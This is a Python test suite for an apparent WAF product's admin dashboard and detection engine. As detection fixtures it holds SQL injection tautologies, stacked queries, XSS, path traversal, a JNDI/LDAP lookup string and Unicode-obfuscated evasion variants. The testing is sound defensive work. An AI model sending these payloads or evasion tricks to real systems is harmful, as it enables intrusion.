"""
test_dataplane.py — 製品(DuckNet L7 Security)の管理ダッシュボード + 単独バンドル検証
====================================================================================
  · 管理ダッシュボード(Web GUI)の制御API: 状態取得・トークン保護・ON/OFF・ルール・
    ハニーポット・エッジ前衛設定DL が動く。
偽シングルトンで実stateを汚さない([[feedback-verification-coverage-honesty]])。
"""
import json
import urllib.request

import dataplane.engine.lifeform.policy as FW
import dataplane.engine.lifeform.pipeline as ND
from dataplane.admin import AdminDashboard


def _req(url, token=None, body=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["X-Token"] = token
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=headers,
                               method="POST" if data is not None else "GET")
    try:
        with urllib.request.urlopen(r, timeout=5) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def _admin_with_temp(tmp):
    FW._FW = FW.AppFirewall(state_dir=tmp)
    ND._SHIELD = ND.NetShield(state_dir=tmp)
    adm = AdminDashboard(host="127.0.0.1", port=0)
    info = adm.start()
    return adm, info["url"], adm.token


def test_dashboard_brand_honors_cover_env():
    # ステルス適用漏れ防止: DUCKNET_COVER だけで(--stealth 無しでも)ダッシュボードのブランド/
    # タイトル/Server から製品名が消える(遮断ページと同じ秘匿源)。
    import os
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        os.environ["DUCKNET_COVER"] = "System Health Monitor"
        adm, url, token = _admin_with_temp(tmp)
        try:
            _, html = _req(url + "/")
            assert b"System Health Monitor" in html
            assert b"DuckNet" not in html          # 製品名が露見しない
        finally:
            os.environ.pop("DUCKNET_COVER", None)
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_state_and_token():
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            # token無し → 401
            code, _ = _req(url + "/api/state")
            assert code == 401
            # token有り → 状態
            code, body = _req(url + "/api/state", token=token)
            assert code == 200
            st = json.loads(body)
            assert "firewall" in st and "shield" in st and "capabilities" in st
            # HTML(ダッシュボード)はtoken不要で取得できる
            code, html = _req(url + "/")
            assert code == 200 and b"DuckNet L7 Security" in html
            # 総合ビューが論理セクションに整理されている(情報設計の回帰防止)
            assert html.count(b'class="sect"') == 6
            for label in ["概況", "脅威モニタリング", "WAF / 検知設定",
                          "アクセス制御・申立", "欺瞞", "詳細分析"]:
                assert label.encode() in html, label
            # 日英 i18n: 言語トグル + 辞書 + 適用関数 + 代表的な英訳が埋め込まれている
            for tk in [b'id="lang"', b"const JA2EN=", b"function applyStatic",
                       b"function setLang", "Threat monitoring".encode(),
                       "Egress DLP (secret leak)".encode()]:
                assert tk in html, tk
            # トークンは HTML/JS に埋め込まれない(XSS で抜かれない)
            assert token.encode() not in html
            r = urllib.request.urlopen(url + "/")
            # セキュリティヘッダ(深層防御)
            assert r.headers.get("X-Frame-Options") == "DENY"
            assert r.headers.get("X-Content-Type-Options") == "nosniff"
            assert "connect-src 'self'" in (r.headers.get("Content-Security-Policy") or "")
            # トークンは HttpOnly + SameSite=Strict Cookie で配られる
            sc = r.headers.get("Set-Cookie") or ""
            assert "ducknet_admin=" in sc and "HttpOnly" in sc and "SameSite=Strict" in sc
            # Cookie 認証でも通る(X-Token ヘッダ無し)
            req = urllib.request.Request(url + "/api/state",
                                         headers={"Cookie": f"ducknet_admin={token}"})
            assert urllib.request.urlopen(req, timeout=5).status == 200
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_deception_status_visualization():
    # #4 配線: デセプション(MTD)の状態とローテーション プレビューを可視化(env 駆動・状態レス)。
    import os
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            # HTML にパネル
            assert b'id="deception"' in _req(url + "/")[1] and "デセプション".encode() in _req(url + "/")[1]
            # 無効(既定)
            os.environ.pop("DUCKNET_DECEPTION", None)
            d = json.loads(_req(url + "/api/deception", token=token)[1])
            assert d["enabled"] is False and d["preview"] == [] and d["family_count"] == 8
            # 有効化 → プレビュー4窓、隣接窓は必ず別系統(MTD)
            os.environ["DUCKNET_DECEPTION"] = "1"
            try:
                d = json.loads(_req(url + "/api/deception", token=token)[1])
                assert d["enabled"] is True and len(d["preview"]) == 4
                fams = [p["family"] for p in d["preview"]]
                assert all(fams[i] != fams[i + 1] for i in range(len(fams) - 1))
                # Server は実在風の名簿から
                from dataplane.engine.services import banner as DC
                assert all(p["server"] in DC._SERVERS for p in d["preview"])
            finally:
                os.environ.pop("DUCKNET_DECEPTION", None)
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_custom_signature_wiring():
    # 別evolution配線(#2 カスタムシグネチャ): GUI から追加/一覧/削除でき、ReDoS は拒否される。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            ND._SHIELD.enable()
            _, html = _req(url + "/")
            assert b'id="customsigs"' in html and "カスタムシグネチャ".encode() in html
            # 一覧(GET)に組込シグネチャと custom_blocked が出る
            sig = json.loads(_req(url + "/api/shield/signatures", token=token)[1])
            assert len(sig["builtin"]) >= 18 and sig["custom"] == []
            # 追加
            code, body = _req(url + "/api/shield/sig_add", token=token,
                              body={"name": "my-rule", "pattern": "evil-?bot"})
            assert code == 200 and json.loads(body)["ok"] is True
            sig = json.loads(_req(url + "/api/shield/signatures", token=token)[1])
            assert [c["name"] for c in sig["custom"]] == ["my-rule"]
            # ReDoS パターンは拒否(自己DoS防止)
            assert json.loads(_req(url + "/api/shield/sig_add", token=token,
                                   body={"name": "bad", "pattern": r"(a+)+$"})[1])["ok"] is False
            # 削除
            assert json.loads(_req(url + "/api/shield/sig_remove", token=token,
                                   body={"name": "my-rule"})[1])["ok"] is True
            sig = json.loads(_req(url + "/api/shield/signatures", token=token)[1])
            assert sig["custom"] == []
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_optional_signature_wiring():
    # 別evolution配線(#2 オプションシグネチャ): ダッシュボードから ssti/ssrf_internal/redirect を
    # 個別に検知対象/非対象へトグルでき、状態に反映される。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            ND._SHIELD.enable()
            _, html = _req(url + "/")
            assert b'id="optsigs"' in html and "追加シグネチャ".encode() in html
            st = json.loads(_req(url + "/api/state", token=token)[1])
            assert set(st["shield"]["optional_signatures"]) == {"ssti", "ssrf_internal", "redirect"}
            assert st["shield"]["cfg"]["optional_sigs"] == {}      # 既定は全OFF
            # ssti を ON
            code, body = _req(url + "/api/shield/optional_sig", token=token,
                              body={"name": "ssti", "on": True})
            assert code == 200 and json.loads(body)["ok"] is True
            st = json.loads(_req(url + "/api/state", token=token)[1])
            assert st["shield"]["cfg"]["optional_sigs"].get("ssti") is True
            # 不正名は拒否
            assert json.loads(_req(url + "/api/shield/optional_sig", token=token,
                                   body={"name": "bogus", "on": True})[1])["ok"] is False
            # 実際に検知挙動が変わる(ON で {{7*7}} がブロック方向)
            assert ND._SHIELD.inspect("203.0.113.61", path="/", query="n={{7*7}}").get("action") != "allow"
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_dlp_wiring():
    # evolution #6 配線: ダッシュボードから DLP の ON/OFF・アクション切替ができ、漏洩が
    # 状態(metrics/events)に出る。HTML にも DLP コントロールが存在する。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            ND._SHIELD.enable()
            # HTML に DLP コントロールが描画される
            _, html = _req(url + "/")
            assert b'id="dlp"' in html and "出口DLP".encode() in html and b'id="leaks"' in html
            # 既定は無効
            st = json.loads(_req(url + "/api/state", token=token)[1])
            assert st["shield"]["cfg"]["dlp_enabled"] is False
            # トグル+アクションを設定 → 反映される
            code, body = _req(url + "/api/shield/config", token=token,
                              body={"dlp_enabled": True, "dlp_action": "block"})
            assert code == 200 and json.loads(body)["ok"] is True
            st = json.loads(_req(url + "/api/state", token=token)[1])
            assert st["shield"]["cfg"]["dlp_enabled"] is True
            assert st["shield"]["cfg"]["dlp_action"] == "block"
            # 漏洩を記録 → metrics と events に出る(ダッシュボードが拾える)
            ND._SHIELD.note_leak("203.0.113.99", ["aws_access_key", "credit_card"])
            st = json.loads(_req(url + "/api/state", token=token)[1])
            assert st["shield_metrics"].get("dlp_leak", 0) >= 1
            leaks = [e for e in st["events"] if e.get("kind") == "dlp_leak"]
            assert leaks and "aws_access_key" in leaks[-1].get("kinds", [])
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_advanced_defenses_wiring():
    # #11〜#16 配線: ダッシュボードから 応答ヘッダ のトグルと paranoia 段階を
    # 操作でき、状態に反映される(バックエンドは既存 /api/shield/config + /api/shield/paranoia)。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            ND._SHIELD.enable()
            _, html = _req(url + "/")
            for cid in (b'id="sech"', b'id="paranoia"',
                        b'id="advstat"'):
                assert cid in html
            assert "詳細防御".encode() in html
            # 既定: すべてOFF / paranoia=1
            st = json.loads(_req(url + "/api/state", token=token)[1])["shield"]["cfg"]
            assert st["sec_headers_enabled"] is False
            assert st["paranoia"] == 1
            # トグルをON(既存 config エンドポイント)
            code, body = _req(url + "/api/shield/config", token=token,
                              body={"sec_headers_enabled": True})
            assert code == 200 and json.loads(body)["ok"] is True
            st = json.loads(_req(url + "/api/state", token=token)[1])["shield"]["cfg"]
            assert st["sec_headers_enabled"]
            # paranoia を段階設定 → optional_sigs も一括反映
            code, body = _req(url + "/api/shield/paranoia", token=token, body={"level": 3})
            assert code == 200 and json.loads(body)["paranoia"] == 3
            st = json.loads(_req(url + "/api/state", token=token)[1])["shield"]["cfg"]
            assert st["paranoia"] == 3
            assert st["optional_sigs"].get("redirect") and st["optional_sigs"].get("ssrf_internal")
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_path_limits_wiring():
    # #21 配線: ダッシュボードから per-path レート制限ルールを追加/削除でき、状態に反映される
    # (バックエンドは set_path_limits=検証/置換/永続化)。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            ND._SHIELD.enable()
            _, html = _req(url + "/")
            for cid in (b'id="pathlimits"', b'id="prpath"', b'id="prrate"',
                        b'id="prburst"', b'id="prlmeta"'):
                assert cid in html
            assert "パス別レート制限".encode() in html
            # 既定は空
            cfg = json.loads(_req(url + "/api/state", token=token)[1])["shield"]["cfg"]
            assert cfg["path_limits"] == []
            # 追加(不正項目混在=検証で除去・burst 既定=rate)
            code, body = _req(url + "/api/shield/path_limits", token=token,
                              body={"rules": [{"path": "/login", "rate": 0.5, "burst": 5},
                                              {"path": "", "rate": 1},          # 除去
                                              {"path": "/api/", "rate": 2}]})    # burst 既定=2
            assert code == 200 and json.loads(body)["ok"] is True
            pl = json.loads(_req(url + "/api/state", token=token)[1])["shield"]["cfg"]["path_limits"]
            assert [r["path"] for r in pl] == ["/login", "/api/"]
            assert pl[0]["burst"] == 5.0 and pl[1]["burst"] == 2.0
            # 1件だけ残す(クライアントは全リスト置換で削除を表現)
            code, _ = _req(url + "/api/shield/path_limits", token=token,
                           body={"rules": [{"path": "/login", "rate": 0.5, "burst": 5}]})
            assert code == 200
            pl = json.loads(_req(url + "/api/state", token=token)[1])["shield"]["cfg"]["path_limits"]
            assert [r["path"] for r in pl] == ["/login"]
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_ops_policy_wiring():
    # #24/#25/#26 配線: throttle応答・サブネット防御・遮断メソッドをダッシュボードから操作でき、
    # 状態/専用エンドポイントに反映される。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            ND._SHIELD.enable()
            _, html = _req(url + "/")
            for cid in (b'id="throttle"', b'id="retryaft"', b'id="subnetdef"',
                        b'id="subthr"', b'id="blockmeth"', b'id="opsstat"'):
                assert cid in html
            assert "レート/メソッド/分散".encode() in html
            # サブネット状態の GET
            sn = json.loads(_req(url + "/api/shield/subnet", token=token)[1])
            assert sn["enabled"] is False and "hot_subnets" in sn
            # throttle / subnet を config 経由でトグル
            _req(url + "/api/shield/config", token=token,
                 body={"throttle_response": False, "subnet_defense": True, "subnet_threshold": 5})
            cfg = json.loads(_req(url + "/api/state", token=token)[1])["shield"]["cfg"]
            assert cfg["throttle_response"] is False and cfg["subnet_defense"] is True
            assert cfg["subnet_threshold"] == 5
            # 遮断メソッドを専用エンドポイントで設定(検証=大文字化/重複除去)
            code, body = _req(url + "/api/shield/blocked_methods", token=token,
                              body={"methods": ["trace", "TRACE", "options"]})
            assert code == 200 and json.loads(body)["blocked_methods"] == ["TRACE", "OPTIONS"]
            cfg = json.loads(_req(url + "/api/state", token=token)[1])["shield"]["cfg"]
            assert cfg["blocked_methods"] == ["TRACE", "OPTIONS"]
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_admin_audit_wiring():
    # 管理アクション監査ログ: mutating POST が成功すると admin_audit.jsonl に1件残り、
    # GET /api/admin_audit で新しい順に取得できる。単純なスカラー設定は revert 情報を持つ。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        adm._state_dir = tmp     # 監査ログの置き場も隔離(他テストと混線させない)
        try:
            _, html = _req(url + "/")
            assert b'id="auditlog"' in html and "変更履歴".encode() in html
            # 初期状態は空
            d = json.loads(_req(url + "/api/admin_audit", token=token)[1])
            assert d["entries"] == []
            # shield ON → 監査ログに1件、revert は shield ON前の状態(False)へ戻す内容
            code, body = _req(url + "/api/shield/toggle", token=token, body={"on": True})
            assert code == 200 and json.loads(body)["ok"] is True
            d = json.loads(_req(url + "/api/admin_audit", token=token)[1])
            assert len(d["entries"]) == 1
            e = d["entries"][0]
            assert e["endpoint"] == "/api/shield/toggle"
            assert e["revert"] == {"endpoint": "/api/shield/toggle", "body": {"on": False}}
            # paranoia 変更: set_paranoia() は paranoia_status() を返すため "ok" キーを持たない
            # ―― それでも監査フックが記録できることを回帰的に確認する(素朴な r.get("ok") 判定
            # だけだとここが記録されない)。
            code, body = _req(url + "/api/shield/paranoia", token=token, body={"level": 3})
            assert code == 200 and json.loads(body)["paranoia"] == 3
            d = json.loads(_req(url + "/api/admin_audit", token=token)[1])
            assert len(d["entries"]) == 2
            assert d["entries"][0]["endpoint"] == "/api/shield/paranoia"   # 新しい順
            assert d["entries"][0]["after"] == 3
            # 失敗した呼び出し(存在しないカスタムシグネチャ削除でも ok:True を返す設計だが、
            # 追加自体が失敗するケースで確認): 不正な signature 名は監査ログに残らない
            before_n = len(d["entries"])
            code, body = _req(url + "/api/shield/sig_add", token=token,
                              body={"name": "bad name!", "pattern": "x"})
            assert json.loads(body)["ok"] is False
            d = json.loads(_req(url + "/api/admin_audit", token=token)[1])
            assert len(d["entries"]) == before_n
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_sig_test_wiring():
    # シグネチャのドライラン試験: 状態を一切変更せず(監査ログにも残さず)、
    # validate_pattern の ReDoS/安全性検査を経てからマッチ判定のみ返す。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        adm._state_dir = tmp     # 監査ログの置き場も隔離(他テストと混線させない)
        try:
            _, html = _req(url + "/")
            assert b'id="sigtestsample"' in html
            # 一致するサンプル
            code, body = _req(url + "/api/shield/sig_test", token=token,
                              body={"pattern": "evil-?bot", "sample": "evilbot/1.0"})
            r = json.loads(body)
            assert code == 200 and r["ok"] is True and r["matches"] is True and r["error"] is None
            # 不一致
            r = json.loads(_req(url + "/api/shield/sig_test", token=token,
                                body={"pattern": "evil-?bot", "sample": "friendly-crawler"})[1])
            assert r["matches"] is False and r["error"] is None
            # ReDoS パターンは validate_pattern で弾かれ、コンパイル/マッチは試みられない
            r = json.loads(_req(url + "/api/shield/sig_test", token=token,
                                body={"pattern": r"(a+)+$", "sample": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"})[1])
            assert r["ok"] is True and r["matches"] is False and r["error"]
            # 状態は一切変更されない: カスタムシグネチャ一覧に残らない
            sig = json.loads(_req(url + "/api/shield/signatures", token=token)[1])
            assert sig["custom"] == []
            # 監査ログにも残らない(読み取り専用)
            d = json.loads(_req(url + "/api/admin_audit", token=token)[1])
            assert d["entries"] == []
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_admin_token_cookie_not_handed_to_unauth_remote():
    # 脆弱性修正(#37): `/` は無条件で admin トークン Cookie を配っていた=非localhost公開時に
    # 誰でも GET / でトークンを取得し全制御APIを乗っ取れた。配布を localhost/認証済みに限定。
    import tempfile
    import urllib.request
    from dataplane.admin import _make_handler
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            ok = _make_handler(adm)._may_set_token_cookie
            assert ok("127.0.0.1", False, "", token) is True          # localhost=配布
            assert ok("::1", False, "", token) is True
            assert ok("203.0.113.5", False, "", token) is False       # 無認証リモート=配らない(修正点)
            assert ok("203.0.113.5", True, "", token) is True         # 認証済みリモート=配布
            assert ok("203.0.113.5", False, token, token) is True     # ?token 正=ブートストラップ可
            assert ok("203.0.113.5", False, "wrong", token) is False  # ?token 誤=配らない
            # 回帰: localhost からの GET / は従来どおり Cookie を受け取れる(管理UXは不変)
            r = urllib.request.urlopen(url + "/", timeout=5)
            cookies = [v for (k, v) in r.getheaders() if k.lower() == "set-cookie"]
            assert any("ducknet_admin=" in c for c in cookies)
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_metrics_exposition_endpoint():
    # 観測性: /api/metrics が plain-text 露出形式でスクレイプ可能(token必須)。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            ND._SHIELD.enable()
            assert _req(url + "/api/metrics")[0] == 401          # 認証必須
            ND._SHIELD.inspect("203.0.113.5", path="/", query="x=1")
            code, body = _req(url + "/api/metrics", token=token)
            assert code == 200
            text = body.decode()
            assert "# TYPE ducknet_requests_total counter" in text
            assert "ducknet_requests_total " in text
            assert "ducknet_shield_enabled 1" in text
            assert "ducknet_paranoia_level 1" in text
            # #25 サブネット集約防御の観測性(#28 で露出)
            assert "# TYPE ducknet_subnet_flag_total counter" in text
            assert "ducknet_hot_subnets 0" in text and "ducknet_tracked_subnets 0" in text
            # シグネチャヒットはラベル付きカウンタで出る
            ND._SHIELD.inspect("203.0.113.6", path="/", query="1 union select a from b")
            text2 = _req(url + "/api/metrics", token=token)[1].decode()
            assert 'ducknet_sig_hits_total{signature="sqli"}' in text2
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_semantic_tautology_catches_value_swapped_sqli():
    # evolution #2 頭金: literal "1=1" をすり抜ける 2=2 / 99=99 / 'a'='a' を *構造* で捕捉。
    from dataplane.engine.lifeform.pipeline import (
        _tautology_suspect, _normalize_for_scan)
    for s in ["2=2", "99=99", "' or 1=1--", "'a'='a'", "x' or '7'='7"]:
        assert _tautology_suspect(_normalize_for_scan(s)) is True, s
    # evolution #2 step 3: = 限定を卒業し、不等式の恒真式(OR 1=1 の WAF 回避亜種)も構造で捕捉
    for s in ["2>1", "1<2", "1>=1", "5<=5", "0<>1", "9!=8",
              "' or 1<2--", "x' or 2 > 1 -- "]:
        assert _tautology_suspect(_normalize_for_scan(s)) is True, s
    for s in ["id=5", "1=2", "user=admin", "a=b", "ratio=16x9",
              "5>9", "1<1", "2>3", "price>100", "1.5<2", "v1<2"]:
        assert _tautology_suspect(_normalize_for_scan(s)) is False, s  # 誤検知しない
    # スタッククエリ(複文): needle 未収載の ;update も構造で捕捉
    from dataplane.engine.lifeform.pipeline import _stacked_query_suspect
    assert _stacked_query_suspect(_normalize_for_scan("1;update users set p=1")) is True
    assert _stacked_query_suspect(_normalize_for_scan("a;b;c")) is False
    # inspect 経由でも(literalシグネチャに無い 2=2 / ;update が)スコア加点される
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        # 既存 needle(--/union 等)を含まない純粋な恒真式=従来は素通り、意味検知が拾う
        d = sh.inspect("198.51.100.30", path="/login", query="q=2=2")
        assert "sqli-tautology" in d.get("reason", "")
        d2 = sh.inspect("198.51.100.31", path="/p", query="id=1;update u set p=1")
        assert "sqli-stacked" in d2.get("reason", "")


def test_method_telemetry_breakdown():
    # evolution #7 拡張: メソッド別(攻撃者入力ゆえ既知名のみ+OTHER畳み)の累積内訳。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        sh.inspect("1.0.0.1", path="/", method="GET")
        sh.inspect("1.0.0.2", path="/", method="POST")
        sh.inspect("1.0.0.3", path="/", method="post")     # 小文字→正規化
        sh.inspect("1.0.0.4", path="/", method="ZZ;evil")  # 不正→OTHER(辞書肥大防止)
        m = sh.metrics()
        assert m["method_hits"] == {"GET": 1, "POST": 2, "OTHER": 1}


def test_zone_telemetry_breakdown_and_public_trend():
    # evolution #7 拡張: 同じテレメトリ基盤をゾーン別へ。累積ゾーン内訳(zone_hits)+
    # 外部(public)推移(series の pub)を出す。アクション別は既存メトリクスで充足。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        sh.inspect("203.0.113.9", path="/", query="a", zone="public")
        sh.inspect("203.0.113.9", path="/", query="b", zone="public")
        sh.inspect("10.0.0.5", path="/", query="c", zone="private")
        sh.inspect("127.0.0.1", path="/", query="d", zone="loopback")
        m = sh.metrics()
        assert m["zone_hits"] == {"public": 2, "private": 1, "loopback": 1}
        # アクション別は既存メトリクスにある(ダッシュボードはこれを横棒で描く)
        assert all(k in m for k in ("allow", "throttle", "block"))
        sh._series_last = 0.0
        s = sh.series(2)
        assert s[-1].get("pub") == 2          # 外部トラフィックの累積→クライアントが差分で推移描画


def test_signature_hit_telemetry_breakdown_and_series():
    # evolution #7 拡張: 同じテレメトリ基盤をシグネチャ検知にも。累積カテゴリ別ヒット(sig_hits)
    # と時系列(series の sig_total)を出す。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        for q in ["a union select b from c", "x=../../etc/passwd", "q=<script>alert(1)",
                  "z=1 union select 2 from d"]:
            sh.inspect("5.5.5.5", path="/", query=q)
        m = sh.metrics()
        assert m["sig_hits"].get("sqli", 0) == 2          # union select ×2
        assert m["sig_hits"].get("traversal", 0) == 1 and m["sig_hits"].get("xss", 0) == 1
        sh._series_last = 0.0
        s = sh.series(3)
        assert s[-1].get("sig_total") == sum(m["sig_hits"].values()) == 4


def test_dlp_telemetry_kinds_breakdown_and_series():
    # evolution #7: 漏洩テレメトリ。種別内訳(dlp_kinds)と時系列(series の dlp_leak)を出す。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        sh.cfg["dlp_enabled"] = True
        sh.note_leak("1.1.1.1", ["aws_access_key", "credit_card"])
        sh.note_leak("2.2.2.2", ["aws_access_key"])
        sh.note_leak("3.3.3.3", ["private_key"])
        m = sh.metrics()
        assert m["dlp_leak"] == 3
        assert m["dlp_kinds"] == {"aws_access_key": 2, "credit_card": 1, "private_key": 1}
        # 時系列サンプルに dlp_leak(累積)が含まれる → クライアントが差分でトレンド描画
        sh._series_last = 0.0
        s = sh.series(5)
        assert "dlp_leak" in s[-1] and s[-1]["dlp_leak"] == 3


def test_egress_dlp_secret_leak_scanner():
    # evolution #6: 出口DLP。応答に混入した秘密情報(鍵/トークン/Luhn検証クレカ)を検出。
    import tempfile
    from dataplane.engine.lifeform.pipeline import scan_secret_leak
    assert scan_secret_leak("key=AKIA1234567890ABCDEF") == ["aws_access_key"]
    assert scan_secret_leak("g=AIza" + "b" * 35) == ["google_api_key"]
    assert scan_secret_leak("gh=ghp_" + "a" * 36) == ["github_token"]
    assert scan_secret_leak("st=sk_live_" + "A" * 24) == ["stripe_secret"]
    assert scan_secret_leak("-----BEGIN RSA PRIVATE KEY-----") == ["private_key"]
    assert scan_secret_leak(b"card 4242 4242 4242 4242") == ["credit_card"]   # Luhn OK
    assert scan_secret_leak("amex 378282246310005") == ["credit_card"]
    # 誤検知しない: 普通のJSON/電話/接頭外や非Luhnの数字列/短い AKIA
    for d in ['{"user":"alice","id":42}', "order 1234567890", "phone 0312345678",
              "AKIAshort", "id=1234567890123456", "n=1111222233334444"]:
        assert scan_secret_leak(d) == [], d
    # DLP は既定OFF=スキャンしない。有効化で動く。設定は永続化。
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        assert sh.dlp_active() is False
        assert sh.scan_leak("key=AKIA1234567890ABCDEF") == []     # OFF=空
        sh.cfg["dlp_enabled"] = True
        sh._save()
        assert sh.dlp_active() is True
        assert sh.scan_leak("key=AKIA1234567890ABCDEF") == ["aws_access_key"]
        r = sh.note_leak("203.0.113.90", ["aws_access_key", "aws_access_key"])
        assert r["action"] == "audit" and r["kinds"] == ["aws_access_key"]   # 重複除去
        assert sh._metrics.get("dlp_leak", 0) >= 1
        sh2 = ND.NetShield(state_dir=tmp)                          # 永続化を確認
        assert bool(sh2.cfg.get("dlp_enabled")) is True


def test_custom_decoder_seam_for_proprietary_encoding():
    # evolution #2 深掘り(独自暗号化型): アプリ固有エンコードの復号 callable を登録すれば、
    # 走査面で復号され全シグネチャが効く。可逆(clear で解除)。壊れたデコーダでも防御は止めない。
    import codecs
    from dataplane.engine.lifeform.pipeline import (
        _normalize_for_scan, _SIG_RE, register_scan_decoder, clear_scan_decoder,
        registered_scan_decoders)
    def hits(s):
        b = _normalize_for_scan(s)
        return {n for n, r in _SIG_RE if r.search(b)}
    payload = codecs.encode("<script>alert(1)", "rot13")     # 独自エンコード例(ROT13)
    assert "xss" not in hits(payload)                        # 登録前は復号されず素通り
    try:
        register_scan_decoder("rot13", lambda s: codecs.decode(s, "rot13"))
        assert "rot13" in registered_scan_decoders()
        assert "xss" in hits(payload)                        # 登録後は復号されて検知
        # 壊れたデコーダを足しても例外で防御は止まらず、他デコーダ/正規化は機能する
        register_scan_decoder("boom", lambda s: (_ for _ in ()).throw(RuntimeError("x")))
        assert "xss" in hits(payload)
    finally:
        clear_scan_decoder("rot13")
        clear_scan_decoder("boom")
    assert "xss" not in hits(payload)                        # 解除後は元通り(可逆)
    assert registered_scan_decoders() == []


def test_server_i18n_block_page_ja_en():
    # i18n 続行: サーバ生成の遮断ページを DUCKNET_LANG(ja|en)で切替(end-user 向け多言語)。
    import os
    from dataplane.engine.core import i18n
    from dataplane.engine.services.proxy import _block_page
    info = {"appeal_available": True, "remain_sec": 120, "appeal_after_sec": 60}
    _orig_loc = i18n._locale_lang
    try:
        os.environ.pop("DUCKNET_LANG", None)
        i18n._locale_lang = lambda: ""        # #84: ロケール非依存にして検証(env無し→既定 ja)
        assert i18n.lang() == "ja"
        ja = _block_page(info).decode("utf-8")
        assert "lang='ja'" in ja and "解除をリクエスト" in ja
        i18n._locale_lang = lambda: "en"      # 英語ロケールなら env 無しでも自動 en
        assert i18n.lang() == "en"
        i18n._locale_lang = _orig_loc
        os.environ["DUCKNET_LANG"] = "en"
        assert i18n.lang() == "en"
        en = _block_page(info).decode("utf-8")
        assert "lang='en'" in en and "Request unblock" in en
        assert "解除" not in en          # 英語時に日本語が混ざらない(主要文言)
        # 数値埋め込みの合成文(残BAN時間)も翻訳テンプレートで出る
        when = _block_page({"remain_sec": 120, "appeal_after_sec": 60}).decode("utf-8")
        assert "available in about 60s" in when and "ban remaining: about 120s" in when
        # 未登録 key は ja フォールバック
        assert i18n.t("nope.key", lang_="en") == "nope.key"
    finally:
        os.environ.pop("DUCKNET_LANG", None)
        i18n._locale_lang = _orig_loc


def test_unicode_evasion_is_normalized():
    # evolution #2 深掘り(ヒエログリフ/絵文字罠): 全角・ゼロ幅・書式制御・\uXXXX/\xXX で
    # 見た目だけ変えた回避を NFKC 正規化+不可視文字除去+エスケープ復号で実体へ戻して捕捉。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    def hits(s):
        b = _normalize_for_scan(s)
        return {n for n, r in _SIG_RE if r.search(b)}
    assert "xss" in hits("＜ｓｃｒｉｐｔ＞alert(1)")            # 全角 <script>
    assert "sqli" in hits("1 ＵＮＩＯＮ ＳＥＬＥＣＴ a from b")  # 全角 UNION SELECT
    assert "xss" in hits("<scr​ipt>alert(1)")          # ゼロ幅スペース挿入
    assert "sqli" in hits("1 uni‌on select a from b")  # ゼロ幅非接合子
    assert "jndi" in hits("${jn­di:ldap://e}")         # ソフトハイフン挿入(jndi)
